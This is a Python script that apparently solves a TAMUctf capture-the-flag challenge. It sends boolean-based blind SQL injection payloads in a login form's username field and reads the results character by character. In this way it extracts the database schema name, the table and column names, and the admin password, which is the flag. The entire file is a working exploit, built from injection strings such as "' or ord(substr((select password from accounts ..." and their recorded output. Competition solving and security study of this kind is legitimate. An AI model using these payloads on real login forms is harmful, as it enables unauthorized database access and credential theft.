import requests


def judge(html):
    return "successfully" in html


url = "http://passwordextraction.tamuctf.com/login.php"


def leak_schema_name():
    flag = False
    for k in range(100):
        if flag:
            break
        schema = ""
        for j in range(1, 100):
            for i in range(126, 32, -1):
                buf = "' or ord(substr((select schema_name from information_schema.schemata limit "
                buf += str(k)
                buf += ",1),"
                buf += str(j)
                buf += ",1)) > "
                buf += str(i)
                buf += " #"
                param = {"username": buf, "password": ""}
                res = requests.post(url, param)
                if judge(res.text):
                    schema += chr(i+1)
                    print(f"[+] now:{schema}")
                    break
            if len(schema) != j:
                if len(schema) != 0:
                    print(f"[*] schema name:{schema}")
                    break
                else:
                    flag = True
                    break


def leak_table_column_name():
    leak = ""
    for j in range(1, 1000):
        for i in range(126, 32, -1):
            buf = "' or ord(substr((select group_concat(table_name,':',column_name) from information_schema.columns where table_schema LIKE 'db' limit 0,1),"
            buf += str(j)
            buf += ",1)) > "
            buf += str(i)
            buf += " #"
            param = {"username": buf, "password": ""}
            res = requests.post(url, param)
            if judge(res.text):
                leak += chr(i+1)
                print(f"[+] now:{leak}")
                break
        if len(leak) != j:
            print(f"[*] {leak}")
            break


def leak_admins_password():
    leak = ""
    for j in range(1, 1000):
        for i in range(126, 32, -1):
            # buf = "' or ord(substr((select username from accounts limit 0,1),"
            buf = "' or ord(substr((select password from accounts where username LIKE 'admin' limit 0,1),"
            buf += str(j)
            buf += ",1)) > "
            buf += str(i)
            buf += " #"
            param = {"username": buf, "password": ""}
            res = requests.post(url, param)
            if judge(res.text):
                leak += chr(i+1)
                print(f"[+] now:{leak}")
                break
        if len(leak) != j:
            print(f"[*] {leak}")
            break


leak_schema_name()
# schema1:db

leak_table_column_name()
# accounts:username,accounts:password

leak_admins_password()
# gigem{h0peYouScr1ptedTh1s}
